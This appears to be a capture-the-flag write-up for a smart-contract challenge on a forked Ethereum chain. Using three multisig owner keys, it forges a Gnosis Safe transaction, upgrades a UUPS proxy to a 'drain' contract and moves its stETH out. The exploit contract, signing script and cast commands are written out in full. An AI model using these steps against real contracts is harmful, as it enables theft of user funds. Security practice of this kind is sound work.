# Be biLlionAireS Today (16 solves) (244 points)

```
Tony led the tech team for a shady Ethereum L2. He assured the CEO that a multi-signature wallet architecture would help protect user funds. He claimed private keys of multisig owners were stored in different hardware wallets and tattooed under his feet so it is super safe.

Note: This challenge runs on fork of Ethereum. Tony added three additional addresses to the multisig:
- 0x6813Eb9362372EEF6200f3b1dbC3f819671cBA69
- 0x7E5F4552091A69125d5DfCb7b8C2659029395Bdf
- 0x2B5AD5c4795c026514f8317c7a215E218DcCD6cF
```

The goal is to get >= 260000 ether of stETH and send to the challenge contract

```solidity

    function isSolved() public view returns (bool) {
        return stETH.balanceOf(address(this)) >= 260000 ether;
    }
```

Multisig :
https://etherscan.io/address/0x67CA7Ca75b69711cfd48B44eC3F64E469BaF608C

It is a Gnosis Safe multisig, it has a `threshold` of 3

![](https://i.imgur.com/BVvWwWw.png)

So, it just need 3 signers to confirm a transaction, and Tony has added 3 addresses to the multisig, and private key of that 3 addresses are known, which are 0x1, 0x2 and 0x3

So we can basically control the multisig, but what's special about this multisig?

I just google the address of the multisig and found this tweet :

https://twitter.com/0xAlex_/status/1726924638939463867

It is the owner of this BLAST contract (thats why the challenge have B L A S T in upper case) : 0x5F6AE08B8AeB7078cf2F96AFb089D7c9f51DA47d

https://etherscan.io/address/0x5F6AE08B8AeB7078cf2F96AFb089D7c9f51DA47d

And that contract has lots of stETH

![](https://i.imgur.com/jtgzTfk.png)

It is a UUPS proxy and the implementation is here :

https://etherscan.io/address/0xa01def05a37850b2e13c8c839aa268845df14276#code


We can upgrade it if we are the owner

```solidity
    function _authorizeUpgrade(address) internal override onlyOwner {}
```

So we can just upgrade it to our malicious contract and drain it's stETH

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Challenge.sol";

contract beBillionaireTodayExploit {

    function proxiableUUID() public view returns (bytes32) {
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    function drain(address to, uint256 amount) public {
        address(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84).call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
    }
}
```

So now we have to sign a transaction to submit a transaction as the multisig, but I'm not familiar with Gnosis Safe multisig, so I spent quite some time to understand its code

First we have to use `encodeTransactionData()` to encode our transaction, which is a call to `upgradeTo()` in the Blast contract

```
 »  abi.encodeWithSignature("upgradeTo(address)", 0x477DA0a84A17bA9e2142Bb0cA2B5Cd7D8Fd55faC)
0x3659cfe6000000000000000000000000477da0a84a17ba9e2142bb0ca2b5cd7d8fd55fac
```

```
# cast call 0x67CA7Ca75b69711cfd48B44eC3F64E469BaF608C "encodeTransactionData(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,uint256)(bytes)" 0x5F6AE08B8AeB7078cf2F96AFb089D7c9f51DA47d 0 0x3659cfe6000000000000000000000000477da0a84a17ba9e2142bb0ca2b5cd7d8fd55fac00000000000000000000000000000000000000000000000000000000 0 0 0 0 0x0000000000000000000000000000000000000000 0x0000000000000000000000000000000000000000 4 -r http://rpc.ctf.so:8545/jbplodsragfywxownltzfrfj/main
0x190147ef22e6b97dff365f80f221989a28eb2d460c7c9933f9980ba4327ce2dad7d3907bde41ced48765f784e3248a23238a6d85919b25020a8e82c2afc37b1fe466
```

After we encoded the transaction data, we can sign the encoded data with the private key of 3 owners we control, and then concatenate the signatures ordered by the addresses

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract SignSignature is Script {
    function sign(uint256 privateKey, bytes32 msgHash) public returns (bytes memory) {
        (uint8 sig_v, bytes32 sig_r, bytes32 sig_s) = vm.sign(privateKey, msgHash);

        console.log("------------------------------------------------------------------------");
        console.log("address :", vm.addr(privateKey));
        console.log("msgHash :");
        console.logBytes32(msgHash);

        console.log("v, r, s :");
        console.log(sig_v);
        console.logBytes32(sig_r);
        console.logBytes32(sig_s);
        console.log("signature :");
        console.logBytes(abi.encodePacked(sig_r, sig_s, sig_v));
        return abi.encodePacked(sig_r, sig_s, sig_v);
    }

    function run() public {
        uint256 privateKey = 1;
        // msg hash of gnosis safe encoded txn :
        bytes32 msgHash = keccak256(hex"190147ef22e6b97dff365f80f221989a28eb2d460c7c9933f9980ba4327ce2dad7d3907bde41ced48765f784e3248a23238a6d85919b25020a8e82c2afc37b1fe466");
        bytes memory sig1 = sign(privateKey, msgHash);
    
        privateKey = 2;
        bytes memory sig2 = sign(privateKey, msgHash);

        privateKey = 3;
        bytes memory sig3 = sign(privateKey, msgHash);

        console.log("------------------------------------------------------------------------");
        console.log("concatenated signature for gnosis safe :");
        // signatures are ordered by the addresses
        console.logBytes(abi.encodePacked(sig2, sig3, sig1));
    }
}
```

```
# forge script script/sign.s.sol
...
  concatenated signature for gnosis safe :
  0xddfde1e33baa6b3ca2c3697be7ae8ecc7bb8a536bcc441e725081e05ee5d949337502443a4a6644ee9e7dc4c0b1ae552ded5fbc7c35aa7cafd5fdc6392f616cd1bd270f19ed0c6193da365ff3925134980ecc06e8de006c8c260e9f809c7e3172732333a8b5a68b36303230f8883d12fb8e7e2a6b694030c86e8d95bcb4b0ec2921b3d92acecff0c3895b72008d9d8f33a366289cd6d93749b1593e7437df316dc8226394416d6926b4c49753106cdeaedc6ba2fb18cac908b1a332cc38807fe3d4f1c
```

After it is signed, call `execTransaction()` with the signature and the transaction data

```
# cast send 0x67CA7Ca75b69711cfd48B44eC3F64E469BaF608C "execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)" 0x5F6AE08B8AeB7078cf2F96AFb089D7c9f51DA47d 0 0x3659cfe6000000000000000000000000477da0a84a17ba9e2142bb0ca2b5cd7d8fd55fac00000000000000000000000000000000000000000000000000000000 0 0 0 0 0x0000000000000000000000000000000000000000 0x0000000000000000000000000000000000000000 0xddfde1e33baa6b3ca2c3697be7ae8ecc7bb8a536bcc441e725081e05ee5d949337502443a4a6644ee9e7dc4c0b1ae552ded5fbc7c35aa7cafd5fdc6392f616cd1bd270f19ed0c6193da365ff3925134980ecc06e8de006c8c260e9f809c7e3172732333a8b5a68b36303230f8883d12fb8e7e2a6b694030c86e8d95bcb4b0ec2921b3d92acecff0c3895b72008d9d8f33a366289cd6d93749b1593e7437df316dc8226394416d6926b4c49753106cdeaedc6ba2fb18cac908b1a332cc38807fe3d4f1c -r http://rpc.ctf.so:8545/jbplodsragfywxownltzfrfj/main --private-key 0x50728cae7bdddce6508167f62d02ef747c73dade6ce0b155dfcc77c699a3ddec
```

Finally, we can just drain the stETH to the challenge contract

```
# cast send 0x5F6AE08B8AeB7078cf2F96AFb089D7c9f51DA47d "drain(address,uint256)" 0x05AdA4b44712112ff994fa8F499bf571DB4d866B 263588214151196931285748 -r http://rpc.ctf.so:8545/jbplodsragfywxownltzfrfj/main --private-key 0x50728cae7bdddce6508167f62d02ef747c73dade6ce0b155dfcc77c699a3ddec --gas-limit 9999999
```

```
# cast call 0x05AdA4b44712112ff994fa8F499bf571DB4d866B "isSolved()" -r http://rpc.ctf.so:8545/jbplodsragfywxownltzfrfj/main
0x0000000000000000000000000000000000000000000000000000000000000001
```

### Flag

```
blaz{C0ngr6t3_yOu_aR3_a1m0s7_Bi11iona1r3s$$}
```

After solving the challenge, I see that the Blast contract is really centralized, and the owners can rug the whole protocol and steal billion dollar worth of tokens at any time